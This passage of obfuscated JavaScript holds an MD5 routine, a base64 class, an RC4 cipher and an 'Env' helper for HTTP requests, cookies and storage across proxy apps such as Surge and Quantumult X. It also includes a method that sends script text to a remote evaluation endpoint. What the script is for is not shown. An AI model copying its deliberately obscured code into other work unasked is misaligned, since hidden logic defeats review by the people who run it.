    _0x25b385 = _0x293e04(_0x25b385, _0x293e04(_0x293e04(_0x26795c(_0x297fde, _0x4f0b6e, _0x853cf9), _0x404011), _0x2766fe));
    return _0x293e04(_0x8b582b(_0x25b385, _0x5727d5), _0x297fde);
  }
  function _0x359d9d(_0x1140b4, _0x1e8672, _0x3850fe, _0x8b7356, _0x9383b3, _0x569b88, _0xeded74) {
    _0x1140b4 = _0x293e04(_0x1140b4, _0x293e04(_0x293e04(_0x20c8b7(_0x1e8672, _0x3850fe, _0x8b7356), _0x9383b3), _0xeded74));
    return _0x293e04(_0x8b582b(_0x1140b4, _0x569b88), _0x1e8672);
  }
  function _0x7f2c5c(_0x2ab061) {
    for (var _0x22e26a, _0x5e23ff = _0x2ab061.length, _0x2472e4 = _0x5e23ff + 8, _0x13f56d = (_0x2472e4 - _0x2472e4 % 64) / 64, _0x66775d = 16 * (_0x13f56d + 1), _0x448fcb = new Array(_0x66775d - 1), _0x1f937b = 0, _0x26720b = 0; _0x5e23ff > _0x26720b;) {
      _0x22e26a = (_0x26720b - _0x26720b % 4) / 4;
      _0x1f937b = _0x26720b % 4 * 8;
      _0x448fcb[_0x22e26a] = _0x448fcb[_0x22e26a] | _0x2ab061.charCodeAt(_0x26720b) << _0x1f937b;
      _0x26720b++;
    }
    _0x22e26a = (_0x26720b - _0x26720b % 4) / 4;
    _0x1f937b = _0x26720b % 4 * 8;
    _0x448fcb[_0x22e26a] = _0x448fcb[_0x22e26a] | 128 << _0x1f937b;
    _0x448fcb[_0x66775d - 2] = _0x5e23ff << 3;
    _0x448fcb[_0x66775d - 1] = _0x5e23ff >>> 29;
    return _0x448fcb;
  }
  function _0x4f6c7e(_0x34eb17) {
    var _0x365a0c,
      _0x37e976,
      _0x139aed = "",
      _0x4abe46 = "";
    for (_0x37e976 = 0; 3 >= _0x37e976; _0x37e976++) {
      _0x365a0c = _0x34eb17 >>> 8 * _0x37e976 & 255;
      _0x4abe46 = "0" + _0x365a0c.toString(16);
      _0x139aed += _0x4abe46.substr(_0x4abe46.length - 2, 2);
    }
    return _0x139aed;
  }
  function _0x50ede0(_0x453b99) {
    _0x453b99 = _0x453b99.replace(/\r\n/g, "\n");
    for (var _0x14ad44 = "", _0x484d95 = 0; _0x484d95 < _0x453b99.length; _0x484d95++) {
      var _0x270596 = _0x453b99.charCodeAt(_0x484d95);
      128 > _0x270596 ? _0x14ad44 += String.fromCharCode(_0x270596) : _0x270596 > 127 && 2048 > _0x270596 ? (_0x14ad44 += String.fromCharCode(_0x270596 >> 6 | 192), _0x14ad44 += String.fromCharCode(63 & _0x270596 | 128)) : (_0x14ad44 += String.fromCharCode(_0x270596 >> 12 | 224), _0x14ad44 += String.fromCharCode(_0x270596 >> 6 & 63 | 128), _0x14ad44 += String.fromCharCode(63 & _0x270596 | 128));
    }
    return _0x14ad44;
  }
  var _0x572b1d,
    _0x3de101,
    _0x14691c,
    _0x51b5f8,
    _0x1400a6,
    _0x3d177c,
    _0x24226f,
    _0x4cc0f0,
    _0x34ab50,
    _0x220992 = [],
    _0x3c2074 = 7,
    _0x114322 = 12,
    _0x5c29cd = 17,
    _0x34ecd5 = 22,
    _0xc854cd = 5,
    _0x25dc20 = 9,
    _0x2da894 = 14,
    _0x2ddf08 = 20,
    _0x4efb8a = 4,
    _0x212462 = 11,
    _0x4110ac = 16,
    _0x23a813 = 23,
    _0x204894 = 6,
    _0x499c6a = 10,
    _0x6df8e9 = 15,
    _0x4e9d65 = 21;
  for (_0x29327c = _0x50ede0(_0x29327c), _0x220992 = _0x7f2c5c(_0x29327c), _0x3d177c = 1732584193, _0x24226f = 4023233417, _0x4cc0f0 = 2562383102, _0x34ab50 = 271733878, _0x572b1d = 0; _0x572b1d < _0x220992.length; _0x572b1d += 16) {
    _0x3de101 = _0x3d177c;
    _0x14691c = _0x24226f;
    _0x51b5f8 = _0x4cc0f0;
    _0x1400a6 = _0x34ab50;
    _0x3d177c = _0x1565d1(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 0], _0x3c2074, 3614090360);
    _0x34ab50 = _0x1565d1(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 1], _0x114322, 3905402710);
    _0x4cc0f0 = _0x1565d1(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 2], _0x5c29cd, 606105819);
    _0x24226f = _0x1565d1(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 3], _0x34ecd5, 3250441966);
    _0x3d177c = _0x1565d1(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 4], _0x3c2074, 4118548399);
    _0x34ab50 = _0x1565d1(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 5], _0x114322, 1200080426);
    _0x4cc0f0 = _0x1565d1(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 6], _0x5c29cd, 2821735955);
    _0x24226f = _0x1565d1(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 7], _0x34ecd5, 4249261313);
    _0x3d177c = _0x1565d1(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 8], _0x3c2074, 1770035416);
    _0x34ab50 = _0x1565d1(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 9], _0x114322, 2336552879);
    _0x4cc0f0 = _0x1565d1(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 10], _0x5c29cd, 4294925233);
    _0x24226f = _0x1565d1(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 11], _0x34ecd5, 2304563134);
    _0x3d177c = _0x1565d1(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 12], _0x3c2074, 1804603682);
    _0x34ab50 = _0x1565d1(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 13], _0x114322, 4254626195);
    _0x4cc0f0 = _0x1565d1(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 14], _0x5c29cd, 2792965006);
    _0x24226f = _0x1565d1(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 15], _0x34ecd5, 1236535329);
    _0x3d177c = _0x478820(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 1], _0xc854cd, 4129170786);
    _0x34ab50 = _0x478820(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 6], _0x25dc20, 3225465664);
    _0x4cc0f0 = _0x478820(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 11], _0x2da894, 643717713);
    _0x24226f = _0x478820(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 0], _0x2ddf08, 3921069994);
    _0x3d177c = _0x478820(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 5], _0xc854cd, 3593408605);
    _0x34ab50 = _0x478820(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 10], _0x25dc20, 38016083);
    _0x4cc0f0 = _0x478820(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 15], _0x2da894, 3634488961);
    _0x24226f = _0x478820(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 4], _0x2ddf08, 3889429448);
    _0x3d177c = _0x478820(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 9], _0xc854cd, 568446438);
    _0x34ab50 = _0x478820(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 14], _0x25dc20, 3275163606);
    _0x4cc0f0 = _0x478820(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 3], _0x2da894, 4107603335);
    _0x24226f = _0x478820(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 8], _0x2ddf08, 1163531501);
    _0x3d177c = _0x478820(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 13], _0xc854cd, 2850285829);
    _0x34ab50 = _0x478820(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 2], _0x25dc20, 4243563512);
    _0x4cc0f0 = _0x478820(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 7], _0x2da894, 1735328473);
    _0x24226f = _0x478820(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 12], _0x2ddf08, 2368359562);
    _0x3d177c = _0x226132(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 5], _0x4efb8a, 4294588738);
    _0x34ab50 = _0x226132(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 8], _0x212462, 2272392833);
    _0x4cc0f0 = _0x226132(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 11], _0x4110ac, 1839030562);
    _0x24226f = _0x226132(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 14], _0x23a813, 4259657740);
    _0x3d177c = _0x226132(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 1], _0x4efb8a, 2763975236);
    _0x34ab50 = _0x226132(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 4], _0x212462, 1272893353);
    _0x4cc0f0 = _0x226132(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 7], _0x4110ac, 4139469664);
    _0x24226f = _0x226132(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 10], _0x23a813, 3200236656);
    _0x3d177c = _0x226132(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 13], _0x4efb8a, 681279174);
    _0x34ab50 = _0x226132(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 0], _0x212462, 3936430074);
    _0x4cc0f0 = _0x226132(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 3], _0x4110ac, 3572445317);
    _0x24226f = _0x226132(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 6], _0x23a813, 76029189);
    _0x3d177c = _0x226132(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 9], _0x4efb8a, 3654602809);
    _0x34ab50 = _0x226132(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 12], _0x212462, 3873151461);
    _0x4cc0f0 = _0x226132(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 15], _0x4110ac, 530742520);
    _0x24226f = _0x226132(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 2], _0x23a813, 3299628645);
    _0x3d177c = _0x359d9d(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 0], _0x204894, 4096336452);
    _0x34ab50 = _0x359d9d(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 7], _0x499c6a, 1126891415);
    _0x4cc0f0 = _0x359d9d(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 14], _0x6df8e9, 2878612391);
    _0x24226f = _0x359d9d(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 5], _0x4e9d65, 4237533241);
    _0x3d177c = _0x359d9d(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 12], _0x204894, 1700485571);
    _0x34ab50 = _0x359d9d(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 3], _0x499c6a, 2399980690);
    _0x4cc0f0 = _0x359d9d(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 10], _0x6df8e9, 4293915773);
    _0x24226f = _0x359d9d(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 1], _0x4e9d65, 2240044497);
    _0x3d177c = _0x359d9d(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 8], _0x204894, 1873313359);
    _0x34ab50 = _0x359d9d(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 15], _0x499c6a, 4264355552);
    _0x4cc0f0 = _0x359d9d(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 6], _0x6df8e9, 2734768916);
    _0x24226f = _0x359d9d(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 13], _0x4e9d65, 1309151649);
    _0x3d177c = _0x359d9d(_0x3d177c, _0x24226f, _0x4cc0f0, _0x34ab50, _0x220992[_0x572b1d + 4], _0x204894, 4149444226);
    _0x34ab50 = _0x359d9d(_0x34ab50, _0x3d177c, _0x24226f, _0x4cc0f0, _0x220992[_0x572b1d + 11], _0x499c6a, 3174756917);
    _0x4cc0f0 = _0x359d9d(_0x4cc0f0, _0x34ab50, _0x3d177c, _0x24226f, _0x220992[_0x572b1d + 2], _0x6df8e9, 718787259);
    _0x24226f = _0x359d9d(_0x24226f, _0x4cc0f0, _0x34ab50, _0x3d177c, _0x220992[_0x572b1d + 9], _0x4e9d65, 3951481745);
    _0x3d177c = _0x293e04(_0x3d177c, _0x3de101);
    _0x24226f = _0x293e04(_0x24226f, _0x14691c);
    _0x4cc0f0 = _0x293e04(_0x4cc0f0, _0x51b5f8);
    _0x34ab50 = _0x293e04(_0x34ab50, _0x1400a6);
  }
  var _0x2a94d6 = _0x4f6c7e(_0x3d177c) + _0x4f6c7e(_0x24226f) + _0x4f6c7e(_0x4cc0f0) + _0x4f6c7e(_0x34ab50);
  return _0x2a94d6.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x3ef74a) {
    var _0xb8f205 = "",
      _0x1a2034,
      _0x4932ab,
      _0x48418f,
      _0x1c638a,
      _0x53db77,
      _0x193739,
      _0x31a3d8,
      _0x463528 = 0;
    _0x3ef74a = _utf8_encode(_0x3ef74a);
    while (_0x463528 < _0x3ef74a.length) {
      _0x1a2034 = _0x3ef74a.charCodeAt(_0x463528++);
      _0x4932ab = _0x3ef74a.charCodeAt(_0x463528++);
      _0x48418f = _0x3ef74a.charCodeAt(_0x463528++);
      _0x1c638a = _0x1a2034 >> 2;
      _0x53db77 = (_0x1a2034 & 3) << 4 | _0x4932ab >> 4;
      _0x193739 = (_0x4932ab & 15) << 2 | _0x48418f >> 6;
      _0x31a3d8 = _0x48418f & 63;
      if (isNaN(_0x4932ab)) {
        _0x193739 = _0x31a3d8 = 64;
      } else {
        isNaN(_0x48418f) && (_0x31a3d8 = 64);
      }
      _0xb8f205 = _0xb8f205 + _keyStr.charAt(_0x1c638a) + _keyStr.charAt(_0x53db77) + _keyStr.charAt(_0x193739) + _keyStr.charAt(_0x31a3d8);
    }
    return _0xb8f205;
  };
  this.decode = function (_0x5b2241) {
    var _0x4e1959 = "",
      _0x2f5593,
      _0x216f70,
      _0x17e2a4,
      _0x501cb8,
      _0x5c55d0,
      _0x19e3e4,
      _0x3d15aa,
      _0x501614 = 0;
    _0x5b2241 = _0x5b2241.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x501614 < _0x5b2241.length) {
      _0x501cb8 = _keyStr.indexOf(_0x5b2241.charAt(_0x501614++));
      _0x5c55d0 = _keyStr.indexOf(_0x5b2241.charAt(_0x501614++));
      _0x19e3e4 = _keyStr.indexOf(_0x5b2241.charAt(_0x501614++));
      _0x3d15aa = _keyStr.indexOf(_0x5b2241.charAt(_0x501614++));
      _0x2f5593 = _0x501cb8 << 2 | _0x5c55d0 >> 4;
      _0x216f70 = (_0x5c55d0 & 15) << 4 | _0x19e3e4 >> 2;
      _0x17e2a4 = (_0x19e3e4 & 3) << 6 | _0x3d15aa;
      _0x4e1959 = _0x4e1959 + String.fromCharCode(_0x2f5593);
      _0x19e3e4 != 64 && (_0x4e1959 = _0x4e1959 + String.fromCharCode(_0x216f70));
      _0x3d15aa != 64 && (_0x4e1959 = _0x4e1959 + String.fromCharCode(_0x17e2a4));
    }
    _0x4e1959 = _utf8_decode(_0x4e1959);
    return _0x4e1959;
  };
  _utf8_encode = function (_0xaf7851) {
    _0xaf7851 = _0xaf7851.replace(/\r\n/g, "\n");
    var _0x26aca4 = "";
    for (var _0x15dc8e = 0; _0x15dc8e < _0xaf7851.length; _0x15dc8e++) {
      var _0xb21c65 = _0xaf7851.charCodeAt(_0x15dc8e);
      if (_0xb21c65 < 128) {
        _0x26aca4 += String.fromCharCode(_0xb21c65);
      } else {
        _0xb21c65 > 127 && _0xb21c65 < 2048 ? (_0x26aca4 += String.fromCharCode(_0xb21c65 >> 6 | 192), _0x26aca4 += String.fromCharCode(_0xb21c65 & 63 | 128)) : (_0x26aca4 += String.fromCharCode(_0xb21c65 >> 12 | 224), _0x26aca4 += String.fromCharCode(_0xb21c65 >> 6 & 63 | 128), _0x26aca4 += String.fromCharCode(_0xb21c65 & 63 | 128));
      }
    }
    return _0x26aca4;
  };
  _utf8_decode = function (_0x22e1f5) {
    c1 = c2 = 0;
    var _0x31b222 = "",
      _0x11ae9c = 0,
      _0x38d834 = c1;
    while (_0x11ae9c < _0x22e1f5.length) {
      _0x38d834 = _0x22e1f5.charCodeAt(_0x11ae9c);
      if (_0x38d834 < 128) {
        _0x31b222 += String.fromCharCode(_0x38d834);
        _0x11ae9c++;
      } else {
        _0x38d834 > 191 && _0x38d834 < 224 ? (c2 = _0x22e1f5.charCodeAt(_0x11ae9c + 1), _0x31b222 += String.fromCharCode((_0x38d834 & 31) << 6 | c2 & 63), _0x11ae9c += 2) : (c2 = _0x22e1f5.charCodeAt(_0x11ae9c + 1), c3 = _0x22e1f5.charCodeAt(_0x11ae9c + 2), _0x31b222 += String.fromCharCode((_0x38d834 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x11ae9c += 3);
      }
    }
    return _0x31b222;
  };
}
function rc4(_0x35a7f0, _0x554487) {
  var _0x1a1134 = Array(256),
    _0x1f40cb = Array(_0x35a7f0.length);
  for (var _0x1553f3 = 0; _0x1553f3 < 256; _0x1553f3++) {
    _0x1a1134[_0x1553f3] = _0x1553f3;
    var _0x47d7e9 = (_0x47d7e9 + _0x1a1134[_0x1553f3] + _0x554487.charCodeAt(_0x1553f3 % _0x554487.length)) % 256,
      _0x57357a = _0x1a1134[_0x1553f3];
    _0x1a1134[_0x1553f3] = _0x1a1134[_0x47d7e9];
    _0x1a1134[_0x47d7e9] = _0x57357a;
  }
  for (var _0x1553f3 = 0; _0x1553f3 < _0x35a7f0.length; _0x1553f3++) {
    _0x1f40cb[_0x1553f3] = _0x35a7f0.charCodeAt(_0x1553f3);
  }
  for (var _0x3da559 = 0; _0x3da559 < _0x1f40cb.length; _0x3da559++) {
    var _0x1553f3 = (_0x1553f3 + 1) % 256,
      _0x47d7e9 = (_0x47d7e9 + _0x1a1134[_0x1553f3]) % 256,
      _0x57357a = _0x1a1134[_0x1553f3];
    _0x1a1134[_0x1553f3] = _0x1a1134[_0x47d7e9];
    _0x1a1134[_0x47d7e9] = _0x57357a;
    var _0x583e64 = (_0x1a1134[_0x1553f3] + _0x1a1134[_0x47d7e9] % 256) % 256;
    _0x1f40cb[_0x3da559] = String.fromCharCode(_0x1f40cb[_0x3da559] ^ _0x1a1134[_0x583e64]);
  }
  return _0x1f40cb.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
